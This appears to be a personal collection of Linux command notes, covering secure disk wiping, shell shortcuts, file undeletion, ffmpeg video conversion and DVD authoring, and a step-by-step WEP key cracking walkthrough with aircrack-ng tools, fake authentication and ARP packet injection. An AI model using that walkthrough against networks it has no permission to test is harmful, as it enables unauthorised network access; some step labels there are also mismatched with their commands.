@@ -1,0 +1,401 @@
+        Linux Notes
+        
+        Matthew Fatheree
+        matthewf@spyder-fonix.com
+        
+    CHANGELOG:
+    
+    04-20-2005        Initial Revision 1.0
+    
+    
+    
+1. Securely Deleting files
+
+
+To eliminate the traces of old removed files, one might want to wipe the empty space. The simple method is to use a standard Linux "dd" utility. To wipe the empty space on /home partition use:
+
+1. dd if=/dev/zero of=/home/bigfile 
+2. sync 
+3. rm /home/bigfile 
+4. sync 
+
+The commands will zero out the empty space on the partition. Doing the same for /tmp partition might cause some applications to crash, thus one must be cautious. Utility "sfill" from thc THC secure_delete package (available at http://packetstorm.linuxsecurity.com/groups/thc/) can overwrite empty space using more stringent algorithm.
+
+--
+Just to clarify a bit: Utilities like shred rely on repeatedly
+overwriting your data, thus making it nearly impossible to extract
+meaningful information from the disk. Hopefully.
+
+Therefore, if you fill a non-journaled file system with one or more
+newly created files[1] you can overwrite everything, including the space
+originally allocated to the journal, once. By using shred and friends on
+those files you perform additional overwrites and make data retrieval
+even more difficult.
+
+[1] dd and /dev/urandom might prove useful. Don't forget to use sync
+afterwards.
+
+
+--
+For that purpose, don't wipe the files, wipe the entire drive (or
+partition).  When I take a system out of production and need to
+dispose of the hard drive, I boot a cd-based linux (knoppix, system
+rescue cd, linux bbc, etc.) and run something like:
+
+shred -x -v -n 5 -z /dev/hda
+
+That gives several passes of random data, a few with fixed bit
+patterns and a final pass of zeros.  That should be sufficient
+for the use you describe.  If not, increase the 5 to a number
+large enought to make yourself feel safe
+
+-------
+
+'^D' ctrl-d does command line competeion listing for tcsh.
+
+!<some number> repeats that command from the command history
+
+'^L' ctrl-l clears the screen
+
+^a beginning of line 
+^e end of line 
+^l clear screen 
+^u kill whole line 
+where ^ is the <ctrl> key.
+
+---------
+
+rpm -qa  -> list installed rpm's
+
+
+RENAMING MULTIPLE FILES
+# rename 100 matt *.JPG
+
+will rename all JPG's in current directory starting with "100" "matt",
+replacing "100" with "matt"
+
+----------------
+
+unzip multiple zip files in 1 directory
+
+
+find . -name "*.zip" -exec unzip '{}' \;
+
+
+
+SED STUFF FOR REPLACING TEXT IN FILES
+
+#below will replace "9\r" in a text file with "\n\n\n\n9"
+
+#!/bin/tcsh
+sed 's/9.$/\n\n\n\n9/' $1 > tmp.txt
+mv -f tmp.txt $1
+
+#below will replace "ggg" in a text file with "aaa"
+
+#!/bin/tcsh
+sed 's/ggg/aaa/' $1 > tmp.txt
+mv -f tmp.txt $1
+
+
+
+----------------
+
+UNDELETE FILES
+
+
+fsck.vfat (and msdos) has an undelete feature, if you can remember the 
+filenames. I'm not sure how well it works (my quick tests worked fine). You 
+can take a snapshot of the device and mount it via loopback to test it.
+
+Something like:
+
+dd if=/dev/sdc1 of=/somepath/carddump bs=1024
+(replace sdc1 with the relevant partition)
+
+then to recover the files (if you know the names)
+fsck.vfat -vru /mycamdir/mydeletedfile.jpg /somepath/carddump
+(I don't think you can undelete more then 1 file at a time, so you might need 
+to do this for each file.)
+
+If you can't remember the names of the files, you can get a rough idea from 
+looking at a hexdump of the fat table;
+fsck.vfat -rv /somepath/carddump
+give me this:
+First FAT starts at byte 512 (sector 1)
+         2 FATs, 16 bit entries
+     16384 bytes per FAT (= 32 sectors)
+
+As the FAT is at the start you can browse it with:
+hexdump -C /somepath/carddump | less
+(note: filenames are missing the first letter and there is no "." between the 
+name and extension, you can assign any first letter to the filename)
+
+Once you've finished undeleting; 
+
+mount /somepath/carddump /mnt/some_mount_point -t vfat -o 
+loop=/dev/loop3,blocksize=1024
+(doesn't have to be loop3, pick a spare loop device)
+
+There is probably a tool out there that does this, and it may be able to read 
+the deleted filenames from the FAT too. 
+
+Working with a snapshot means you can fiddle with it to your hearts content 
+without affecting the original image, so you can always try to recover the 
+original with a Windows utility.
+
+
+
+=======================
+
+Editing video from the command line
+
+
+FFMPEG on the command line:
+===================
+
+by selecting a format as one of the options ("vcd", "svcd", "dvd", "dv", "pal-vcd", "ntsc-svcd"), all the format options (bitrate, codecs, buffer sizes) are then set automatically. 
+
+You can just type:
+$ ffmpeg -i myfile.avi -target vcd /tmp/vcd.mpg
+
+#same example but use high quality, ntsc vcd format
+$ ffmpeg -i myfile.avi -hq -target ntsc-vcd /tmp/vcd.mpg
+
+#same example but dvd quality
+$ ffmpeg -i myfile.avi -target ntsc-dvd /tmp/dvd.mpg
+
+#same example use same quality as source
+$ ffmpeg -1 myfile.avi -sameq -target vcd /tmp/vcd.mpg
+
+#converting a file for VCD format using a and b frames for MPEG 2
+$ ffmpeg -i myfile.avi -target ntsc-vcd -bf 2 /home/user/Video/vcd.mpg
+
+#same conversion, but start at 0 seconds and convert only first 45 minutes
+#use -ss for start position and -t for duration
+$ ffmpeg -i myfile.avi -target ntsc-vcd -bf 2 -ss 00:00:00 -t 00:45:00 /home/user/Video/vcd.mpg
+
+#converting a file to mpeg using mencoder (poorer quality than ffmpeg I think, but that's on my system - and it really depends on the file and the codec you're using)
+#see the tovid examples below for better better results with mencoder
+$ mencoder -oac copy -ovc lavc -of mpeg -o output_file.mpg your_file.wmv
+
+A new trick that I learned was that you can use ffmpeg to extract audio only from video files. Recently I made some .mpg files for a promo dvd I was making for my band. I wanted to also make a promo cd - but use the audio from the video files. Using ffmpeg, it's possible to rip the audio from any video file (it can convert) directly to an mp3 file like this:
+$ ffmpeg -i video.mpg -f mp3 audio_track.mp3
+
+
+
+MORE VIDEO STUFF
+-----------------
+
+
+Rip a DVD
+mencoder -ovc copy -oac copy -dvd-device /dev/cdrom dvd:// -o <outfile>.mpg
+
+
+
+Using ffmpeg, I created my video clip, experimented with timing, frame rate, and so on, until I had something that was getting pretty good. With the following command, I created an AVI format video clip at 10 frames per second.
+
+ffmpeg -vd /dev/video -ad /dev/sound/dsp -r 10 -s 352x288 video_test.avi
+
+That's it. My video device input (indicated by the -vd flag) is /dev/video and my sound, or audio, input was /dev/sound/dsp. That's the -ad flag. Your own devices may be a little different of course. For instance, on another of my machines, the USB video device is /dev/video0. As it stands, the command will continue to record pretty much until forever or until you run out of disk space. So, to limit a recording to 10 seconds, I use the "-t" flag. Like so:
+
+ffmpeg -vd /dev/video -ad /dev/sound/dsp -r 10 -s 352x288 -t 10 video_test.avi
+
+The resulting clip, which I called video_test.avi, can them be played with Xine, Kmplayer, mplayer, or whatever video player you prefer. Well, mes amis, my foray into video production on the cheap was a success, or so I thought. When I sent the video clip for approval, I was asked whether they could have it in MPG format instead. Rather than redoing what was obviously a great work of cinematography, I converted it using the following command.
+
+ffmpeg -i video_test.avi video_test.mpg
+
+
+
+
+
+
+We only want a preview so we provide the start position and the length: -ss 0:20 specifies 20seconds into the movie as our beginning, and -endpos 0:30 says that we want 30seconds to be processed. This parameter is named badly as it's not the end position but the duration that it specifies.
+Put together the complete command line looks like this:
+nice -+19 mencoder -oac copy -o /dev/null -ovc lavc -lavcopts vcodec=mpeg4:vbitrate=1000:vhq:vpass=1 -vop scale=640:480 -npp lb -ss 0:20 -endpos 0:30 /space/first.vob 
+4.3.3. Generating a preview (second pass)
+For this step we can keep most of our previous command line. Of course we change the vpass=1 to vpass=2 to tell the encoder that it's the second pass this time. Of course we should save the final output and replace -o /dev/null with something useful, e.g. -o ally-preview.avi.
+
+Here's the command line:
+nice -+19 mencoder -oac copy -o ally-preview.avi -ovc lavc -lavcopts vcodec=mpeg4:vbitrate=1000:vhq:vpass=2 -vop scale=640:480 -npp lb -ss 0:20 -endpos 0:30 /space/first.vob 
+After MEncoder finishes take a look at your preview. Adjust parameters if needed. Redo the preview until you're happy with it. 
+4.3.4. Generating the final AVI (both passes)
+The calls for the final options simply leave out -ss and -endpos. Unfortunately MEncoder can't handle multiple input files on the command line. That's what the cat is for. Just enter:
+cat /space/*vob | nice -+19 mencoder -oac copy -o /dev/null -ovc lavc -lavcopts vcodec=mpeg4:vbitrate=1000:vhq:vpass=1:vqmin=2:vqmax=31 -vop scale=640:480 -npp lb -
+cat /space/*vob | nice -+19 mencoder -oac copy -o ally.avi -ovc lavc -lavcopts vcodec=mpeg4:vbitrate=1000:vhq:vpass=2:vqmin=2:vqmax=31 -vop scale=640:480 -npp lb -
+Note that -ss does not seem to work with the cat *vob | mencoder... variant. So for the preview just specify the first vob as the last argument on the command line (just look up).
+
+
+CREATING DVDS
+==============
+
+Change to that directory in konsole, then enter this command
+ffmpeg -i HarddriveinAction.avi -target pal-vcd Hard.mpg
+
+Then use k3b to burn it. 
+file>new video cd project>drag in Hard.mpg. Burn.
+This created a vcd playable in my standalone dvd player.
+
+If that worked try this:
+ffmpeg -i HarddriveinAction.avi -target pal-dvd Hard2.mpg
+
+To work with this mpeg first create a template as shown here
+http://www.linux.com/article.pl?sid=06/04/17/2058219
+
+Replace the vob file line in the sample with this (kate works well for this)
+<vob file="Hard2.mpg" />
+Save this as Hard.xml to the same directory the video files are located.
+
+Now working from that directory run
+dvdauthor -o Hard_dvd -x Hard.xml
+
+If all goes well you should be able to use k3b;
+file>new video dvd project>drag in the AUDIO_TS and VIDEO_TS folders (directories)from the newly created Hard_dvd directory. Burn.
+This created a simple dvd that also plays in my standalone player.
+
+
+
+PUTTING ATHEROS CARD INTO MONITOR MODE
+to create card
+wlanconfig ath1 create wlandev wifi0 wlanmode monitor
+
+to put card into monitor mode
+ifconfig ath1 up
+
+
+
+WEP CRACKING
+====================================
+
+1. Start the wireless interface in monitor mode on the specific AP channel
+    First stop ath0 by entering: 
+        airmon-ng stop ath0   
+
+    The system responds: 
+        Interface       Chipset         Driver
+ 
+        wifi0           Atheros         madwifi-ng
+        ath0            Atheros         madwifi-ng VAP (parent: wifi0) (VAP destroyed)
+
+    Enter “iwconfig” to ensure there are no other athX interfaces. It should look similar to this: 
+        lo        no wireless extensions.
+        eth0      no wireless extensions.
+        wifi0     no wireless extensions.
+
+    If there are any remaining athX interfaces, then stop each one. When you are finished, run “iwconfig” to ensure there are none left. 
+    Enter the following command to start the wireless card on channel 9 in monitor mode: 
+        airmon-ng start wifi0 9
+
+    Use aireplay-ng to do a fake authentication with the access point
+    airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w output ath0
+    
+    where
+    -c 9 is the channel for the wireless network
+    --bssid 00:14:6C:7E:40:80 is the access point MAC address. This eliminate extraneous traffic.
+    -w capture is file name prefix for the file which will contain the IVs.
+    ath0 is the interface name.
+
+2. Start airodump-ng on AP channel with a bssid filter to collect the new unique IVs
+    aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0
+    
+    where: 
+    -1 means fake authentication
+    0 reassociation timing in seconds
+    -e teddy is the wireless network name
+    -a 00:14:6C:7E:40:80 is the access point MAC address
+    -h 00:0F:B5:88:AC:82 is our card MAC addresss
+    ath0 is the wireless interface name
+
+        Success looks like: 
+        18:18:20  Sending Authentication Request
+        18:18:20  Authentication successful
+        18:18:20  Sending Association Request
+        18:18:20  Association successful :-)
+
+
+3. Start aireplay-ng in ARP request replay mode to inject packets
+    Or another variation for picky access points: 
+    aireplay-ng -1 6000 -o 1 -q 10 -e teddy -a 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0
+    
+    Where: 
+    6000 - Reauthenticate very 6000 seconds. The long period also causes keep alive packets to be sent.
+    -o 1 - Send only one set of packets at a time. Default is multiple and this confuses some APs.
+    -q 10 - Send keep alive packets every 10 seconds.
+    
+    Success looks like: 
+    18:22:32  Sending Authentication Request
+    18:22:32  Authentication successful
+    18:22:32  Sending Association Request
+    18:22:32  Association successful :-)
+    18:22:42  Sending keep-alive packet
+    18:22:52  Sending keep-alive packet
+    # and so on.
+    
+    Here is an example of what a failed authentication looks like: 
+    8:28:02  Sending Authentication Request
+    18:28:02  Authentication successful
+    18:28:02  Sending Association Request
+    18:28:02  Association successful :-)
+    18:28:02  Got a deauthentication packet!
+    18:28:05  Sending Authentication Request
+    18:28:05  Authentication successful
+    18:28:05  Sending Association Request
+    18:28:10  Sending Authentication Request
+    18:28:10  Authentication successful
+    18:28:10  Sending Association Request
+ 
+4. Start aireplay-ng in ARP request replay mode   
+    aireplay-ng -3 -b 00:14:6C:7E:40:80 -h 00:0F:B5:88:AC:82 ath0
+    
+    Here is what the screen looks like when ARP requests are being injected: 
+        Saving ARP requests in replay_arp-0321-191525.cap
+        You should also start airodump-ng to capture replies.
+        Read 629399 packets (got 316283 ARP requests), sent 210955 packets...
+
+confirm that you are injecting by checking your airodump-ng screen. The data packets should be increasing. The ”#/s” should be a decent number. 
+    
+
+5. Run aircrack-ng to crack key using the IVs collected
+
+
+    PTW method successfully determines the WEP key compared to the FMS/Korek method. As a reminder, the PTW method only works successfully with arp request/reply packets.  The other requirement is that you capture the full packet with airodump-ng. Meaning, do not use the ”- -ivs” option. 
+    
+    PTW:
+    Start another console session and enter: 
+    aircrack-ng -z -b 00:14:6C:7E:40:80 output*.cap
+    
+    Where: 
+    -z invokes the PTW WEP-cracking method.
+    -b 00:14:6C:7E:40:80 selects the one access point. 
+    This is optional since originally captured data, was applied a filter to only capture data for this one AP.
+    output*.cap selects all files starting with “output” and ending in ”.cap”.
+    
+    To also use the FMS/Korek method, start another console session and enter: 
+    aircrack-ng -b 00:14:6C:7E:40:80 output*.cap
+    
+    Where: 
+    -b 00:14:6C:7E:40:80 selects the one access point we are interested in. 
+    output*.cap selects all files starting with “output” and ending in ”.cap”.
+
+    You can run this while generating packets. In a short time, the WEP key will be calculated and presented. Using the PTW method, 40-bit WEP can be cracked with as few as 20,000 data packets and 104-bit WEP with 40,000 data packets. These are very approximate and there are many variables as to how many IVs you actually need to crack the WEP key.
+    
+
+to create arp packets
+aireplay-ng -3 -b <bssid> -h <associated mac> ath1
+
+to fake association and get arp wep packets
+aireplay-ng -5 -b <bssid> -h <client / some mac> ath1
+
+to fake association
+aireplay-ng -1 5 -e "A76I1" -b 00:18:01:e9:0c:c5 -h 00:18:01:26:90:e6 ath1
+
+
+
+
+
+
+------------------------
+
+save iptables rules as default ( make them persistent )
+sudo dpkg-reconfigure iptables-persistent
+
